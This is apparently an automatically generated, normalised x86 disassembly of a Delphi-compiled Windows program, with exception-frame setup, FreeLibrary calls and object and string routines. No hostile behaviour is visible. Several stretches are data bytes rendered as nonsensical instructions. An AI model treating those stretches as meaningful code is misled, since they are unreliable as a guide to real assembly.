cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
mov bl 0x1
sub_464948
cmp [ rw-data ] 0x0
jle r-xdata
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jle r-xdata
mov eax [ rw-data ]
push eax
call FreeLibrary
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jle r-xdata
mov eax [ rw-data ]
push eax
call FreeLibrary
xor eax eax
mov [ rw-data ] eax
retn
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_4649cc
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4649f8
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4649ff
retn
call sub_464948
sub_464b00
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
call sub_45d3e8
test al al
jne r-xdata
mov [ ebx + 0xf ] 0x1
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
cmp [ ebx + 0xe ] 0x0
jne r-xdata
mov eax ebx
call sub_403294
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x38 ]
mov edx ebx
mov eax [ esi + 0x30 ]
call sub_414548
pop esi
pop ebx
retn
sub_464b40
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_464b65
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_464b6c
retn
sub_464d10
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_464d35
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_464d3c
retn
sub_464d48
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_464e1c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov eax [ ebp - 0xc ]
call sub_404310
mov [ ebp - 0x10 ] eax
mov ebx 0x1
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0xc ]
call sub_404654
mov esi eax
test esi esi
jle r-xdata
mov eax [ ebp - 0x4 ]
call sub_404310
cmp ebx eax
jg r-xdata
lea eax [ ebp - 0x14 ]
push eax
mov ecx esi
sub ecx ebx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_404570
cmp [ ebp - 0x14 ] 0x0
jbe r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_464e23
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_404074
retn
lea eax [ ebp - 0x18 ]
push eax
mov ecx 0x7fffffff
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_404570
mov edx [ ebp - 0x18 ]
mov ecx ebx
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
mov ebx [ ebp - 0x10 ]
add ebx esi
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0xc ]
call sub_45d4b0
mov esi eax
test esi esi
jg r-xdata
mov ecx ebx
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
sub_464e2c
push ebp
mov ebp esp
push ecx
mov ecx 0x4
push 0x0
push 0x0
dec ecx
jne r-xdata
xchg [ ebp - 0x4 ] ecx
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_464f5d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov eax [ ebp - 0x8 ]
call sub_404310
mov [ ebp - 0x10 ] eax
mov ebx 0x1
lea edx [ ebp - 0xc ]
mov eax esi
call sub_407e14
xor eax eax
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0xc ]
call sub_404310
test eax eax
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_464f64
lea eax [ ebp - 0x24 ]
mov edx 0x3
call sub_404074
lea eax [ ebp - 0x14 ]
call sub_404050
lea eax [ ebp - 0xc ]
call sub_404050
retn
jmp r-xdata
mov eax [ ebp - 0x18 ]
cmp [ esi + eax ] 0x20
jbe r-xdata
inc [ ebp - 0x18 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_404654
mov esi eax
test esi esi
jle r-xdata
mov eax [ ebp - 0xc ]
call sub_404310
cmp ebx eax
jg r-xdata
lea eax [ ebp - 0x14 ]
push eax
mov ecx esi
sub ecx ebx
mov edx ebx
mov eax [ ebp - 0xc ]
call sub_404570
cmp [ ebp - 0x14 ] 0x0
jbe r-xdata
lea eax [ ebp - 0x24 ]
push eax
mov ecx 0x7fffffff
mov edx ebx
mov eax [ ebp - 0xc ]
call sub_404570
mov eax [ ebp - 0x24 ]
lea edx [ ebp - 0x20 ]
call sub_407e14
mov edx [ ebp - 0x20 ]
mov ecx [ ebp - 0x18 ]
add ecx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
mov ebx [ ebp - 0x10 ]
add ebx esi
mov ecx ebx
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_45d4b0
mov esi eax
test esi esi
jg r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x14 ]
call sub_407e14
mov edx [ ebp - 0x1c ]
mov ecx [ ebp - 0x18 ]
add ecx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
sub_464f6c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_464f91
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_464f98
retn
sub_464fa4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov [ ebp - 0x5 ] 0x1
mov al [ ebp - 0x5 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
xor eax eax
push ebp
push sub_464fe9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_414534
cmp ebx [ eax + 0x8 ]
seta [ ebp - 0x5 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_414598
retn
sub_464ffc
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_465021
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_465028
retn
sub_4651c4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41a944
mov dl 0x1
mov eax [ r-xdata ]
call sub_4143dc
mov [ esi + 0x30 ] eax
mov [ esi + 0x38 ] 0x3
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035a0
mov eax esi
pop esi
pop ebx
retn
call sub_4035f8
pop [ fs : 0x0 ]
add esp 0xc
sub_46520c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_46527b
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
mov cl 0x1
mov dl 0x1
mov eax [ ebx + 0x34 ]
call [ eax + 0x28 ]
mov esi eax
mov ecx 0x80000001
mov dl [ ebx + 0x38 ]
mov eax esi
call sub_45d414
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_465282
lea eax [ ebp - 0x4 ]
call sub_404050
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405b50
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b590
call sub_403a08
sub_46528c
push ebx
push esi
call sub_403608
mov ebx edx
mov esi eax
lea eax [ esi + 0x30 ]
call sub_40d19c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41a990
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035f0
sub_4652c0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4652e5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4652ec
retn
sub_465f27
fadd [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
adc [ eax ] eax
or [ edi + 0x6e ] ecx
inc ebp
js r-xdata
add [ eax ] al
add [ eax + 0x4f110014 ] al
outsb
dec esp
imul esi [ ebx + 0x74 ] 0x78456e65
arpl [ ebp + 0x70 ] sp
je r-xdata
arpl [ ebp + 0x74 ] si
int3
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x520a0017 ] al
jo r-xdata
outsd
outsb
add [ eax + 0x1388 ] al
sbb al [ eax ]
adc [ ebp + 0x72 ] edx
insd
jns r-xdata
jmp [ eax + 0x1ff0000 ]
sub al 0x61
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] ch
arpl [ ebx + 0x65 ] bp
je r-xdata
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dh
popad
inc esi
add [ eax + eax ] cl
jb r-xdata
inc esi
add [ eax + eax ] cl
add [ eax ] al
xor [ ebx + 0x34c40045 ] dl
inc eax
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x45110040 ] al
dec ecx
push esp
inc ebx
push eax
push ebx
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub al 0x61
adc [ eax ] al
movsb [ edi ] [ esi ]
add [ eax ] al
jmp [ eax + eax + 0x1ff00 ]
imul ebp [ esi + 0x61 ] 0x61576574
imul esi [ esp + edx * 2 + 0x69 ] 0x50d0656d
inc esi
add [ eax + 0x6b ] bl
inc esi
add [ eax ] ah
add dh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sbb eax [ eax ]
or [ eax + ebp * 2 + 0x72 ] edx
popad
dec ebp
jae r-xdata
inc ebp
add al ch
fwait
xchg esi eax
inc esi
add ah al
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x45190040 ] al
dec ecx
push esp
jb r-xdata
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x45150040 ] al
dec ecx
dec esi
outsd
inc ebp
js r-xdata
jb r-xdata
imul esp [ ebp + 0x74 ] 0x54
inc [ ebp ]
hlt
mov eax [ r-xdata ]
call sub_45fffc
mov [ esi + 0x7c ] eax
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_45fffc
mov [ esi + 0x94 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4143dc
mov [ esi + 0xac ] eax
mov eax [ r-xdata ]
mov [ esi + 0xa8 ] eax
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_45fffc
mov [ esi + 0xf4 ] eax
mov [ esi + 0xa4 ] 0x1388
mov [ esi + 0x90 ] 0xf
mov eax esi
test bl bl
je r-xdata
imul ebp [ esi + 0x61 ] 0x68546574
jb r-xdata
popad
je r-xdata
arpl [ ebp + 0x74 ] si
push ebx
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsd
jb r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_4035f8
pop [ fs : 0x0 ]
add esp 0xc
popad
push esp
leave
mov dl 0x1
imul ebp [ ebp + 0x65 ] 0x8b74756f
rcl [ ebx + 0x56 ] 0x84
shl [ eax + ecx - 0x7d ] cl
push esp
push 0x64616572
push esp
arpl [ ecx + 0x66 ] bp
imul esp [ ebp + 0x64 ] 0x61f0c08b
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5409001b ] al
push 0x64616572
dec ebp
ror [ ecx + 0x46 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + 0xc0046 ] cl
add [ eax ] al
loopne r-xdata
add [ eax ] al
loopne r-xdata
inc esi
add ah al
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al bl
xor al 0x40
add ah cl
xor al 0x40
sub_46620c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_45de14
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_45f8d0
mov [ esi + 0x70 ] eax
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_4603c4
mov [ esi + 0x9c ] eax
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_467054
mov [ esi + 0x74 ] eax
mov [ esi + 0x78 ] 0x1
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_45fffc
mov [ esi + 0x7c ] eax
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_45fffc
mov [ esi + 0x94 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4143dc
mov [ esi + 0xac ] eax
mov eax [ r-xdata ]
mov [ esi + 0xa8 ] eax
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_45fffc
mov [ esi + 0xf4 ] eax
mov [ esi + 0xa4 ] 0x1388
mov [ esi + 0x90 ] 0xf
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035a0
mov eax esi
pop esi
pop ebx
retn
call sub_4035f8
pop [ fs : 0x0 ]
add esp 0xc
sub_4662e8
push ebx
push esi
call sub_403608
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x4c ]
cmp [ esi + 0x88 ] 0x0
je r-xdata
lea eax [ esi + 0x70 ]
call sub_40d19c
lea eax [ esi + 0xf4 ]
call sub_40d19c
lea eax [ esi + 0x9c ]
call sub_40d19c
lea eax [ esi + 0xac ]
call sub_40d19c
lea eax [ esi + 0x94 ]
call sub_40d19c
lea eax [ esi + 0x7c ]
call sub_40d19c
lea eax [ esi + 0x74 ]
call sub_40d19c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_45deac
test bl bl
jle r-xdata
cmp [ esi + 0x81 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035f0
lea eax [ esi + 0x88 ]
call sub_40d19c
sub_4663b8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx [ ebx + 0x7c ]
mov eax [ ebx + 0x9c ]
call sub_46045c
mov edx [ ebx + 0x7c ]
mov eax [ esi + 0x68 ]
call sub_4622f4
cmp [ ebx + 0xc2 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0xc4 ]
call [ ebx + 0xc0 ]
sub_46642c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_466586
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x78 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xda ] 0x0
setne [ ebp - 0x9 ]
cmp [ ebp - 0x9 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x74 ]
call sub_414eb0
test eax eax
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46658d
lea eax [ ebp - 0x10 ]
call sub_404050
retn
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebx + 0xdc ]
call [ ebx + 0xd8 ]
mov [ ebp - 0x9 ] 0x1
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x68 ]
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
push 0xffffffff
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x68 ]
or ecx 0xffffffff
mov edx r-xdata
mov ebx [ eax ]
call [ ebx + 0x70 ]
mov eax [ ebp - 0x10 ]
call sub_404310
test eax eax
jle r-xdata
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_466398
xor eax eax
push ebp
push sub_466542
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x74 ]
call sub_414eb0
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_466378
retn
inc eax
mov [ ebp - 0x14 ] eax
xor ebx ebx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x74 ]
call sub_414eb0
dec eax
cmp ebx eax
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
mov eax esi
mov esi [ eax ]
call [ esi + 0x20 ]
test al al
jne r-xdata
inc ebx
dec [ ebp - 0x14 ]
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_4665c0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x74 ]
mov edx ebx
call sub_467098
mov esi eax
cmp [ esi + 0x19 ] 0x0
je r-xdata
sub_4665c0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi ecx
mov ebx eax
xor eax eax
push ebp
push sub_46664c
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0xea ] 0x0
je r-xdata
mov eax [ ebx + 0xf4 ]
call sub_4602fc
test al al
je r-xdata
push esi
mov ecx edx
mov edx ebx
mov eax [ ebx + 0xec ]
call [ ebx + 0xe8 ]
jmp r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405b50
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b590
call sub_403a08
mov edx [ ebx + 0xf4 ]
mov eax [ esi + 0x68 ]
call sub_4622f4
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_466653
lea eax [ ebp - 0x4 ]
call sub_404050
retn
sub_466660
push ebx
mov ebx eax
mov eax ebx
call sub_41ad94
cmp [ ebx + 0x68 ] 0x0
je r-xdata
pop ebx
retn
mov [ ebx + 0x68 ] 0x0
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x4c ]
sub_466680
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_41ac60
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp edi [ esi + 0x6c ]
jne r-xdata
cmp edi [ esi + 0x84 ]
jne r-xdata
mov eax esi
call sub_466a38
xor eax eax
mov [ esi + 0x6c ] eax
jmp r-xdata
cmp edi [ esi + 0x88 ]
jne r-xdata
xor eax eax
mov [ esi + 0x84 ] eax
jmp r-xdata
xor eax eax
mov [ esi + 0x88 ] eax
sub_4666d4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
mov dl [ ebp - 0x5 ]
mov [ eax + 0x68 ] dl
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x68 ]
cmp al [ ebp - 0x5 ]
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x1
jne r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_466990
xor eax eax
push ebp
push sub_4668d2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_466a38
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x80 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x79 ] 0x0
jne r-xdata
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xac ]
mov edx 0x1
call sub_464fa4
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x70 ]
call sub_414eb0
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x79 ] 0x1
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x48 ]
mov eax [ ebp - 0x4 ]
add eax 0x6c
call sub_40d19c
mov eax [ ebp - 0x4 ]
mov [ eax + 0x80 ] 0x0
mov eax [ ebp - 0x4 ]
call sub_466b58
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0xa8 ]
mov [ eax + 0x34 ] edx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x88 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x70 ]
call sub_45f8b0
mov dl 0x1
mov eax [ r-xdata ]
call sub_4143dc
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8c ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x88 ]
mov edx [ eax ]
call [ edx + 0x3c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x70 ]
call sub_414eb0
mov edi eax
dec edi
test edi edi
jl r-xdata
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_45de14
mov edx eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x5c ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x81 ] 0x1
inc edi
xor esi esi
mov eax [ rw-data ]
push eax
push 0x4
mov ecx 0x4
mov edx 0xffff
mov eax ebx
call sub_45f300
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xa0 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x70 ]
mov edx esi
call sub_45f90c
mov ebx eax
xor ecx ecx
mov edx 0x1
mov eax ebx
call sub_45f1e0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xa0 ] 0x1
je r-xdata
jmp r-xdata
mov eax ebx
call sub_45f36c
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x90 ]
mov eax ebx
call sub_45f4a8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x70 ]
mov edx esi
call sub_45f90c
push eax
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_466ba8
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8c ]
mov edx ebx
call sub_4144ac
mov eax ebx
mov edx [ eax ]
call [ edx + 0x2c ]
inc esi
dec edi
jne r-xdata
jmp r-xdata
sub_46691c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x80 ] 0x0
je r-xdata
mov [ ebx + 0x6c ] esi
test esi esi
je r-xdata
lea eax [ ebx + 0x6c ]
call sub_40d19c
mov [ ebx + 0x80 ] 0x0
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
call sub_41aa14
sub_466950
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x88 ] 0x0
je r-xdata
mov [ ebx + 0x88 ] esi
test esi esi
je r-xdata
cmp [ ebx + 0x81 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
call sub_41aa14
mov [ ebx + 0x81 ] 0x0
lea eax [ ebx + 0x88 ]
call sub_40d19c
sub_466990
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8c ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
call sub_414534
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_466a1c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8c ]
call sub_414598
retn
inc esi
xor edi edi
mov edx edi
mov eax [ ebp - 0x8 ]
call sub_414170
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
mov eax [ ebx + 0x68 ]
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov eax ebx
call sub_41a8a0
mov eax ebx
call sub_403294
inc edi
dec esi
jne r-xdata
sub_466a38
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_466b48
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xac ]
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_466b4f
lea eax [ ebp - 0x10 ]
call sub_404050
retn
call sub_414534
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_466ac0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_466ac7
mov eax [ ebp - 0x4 ]
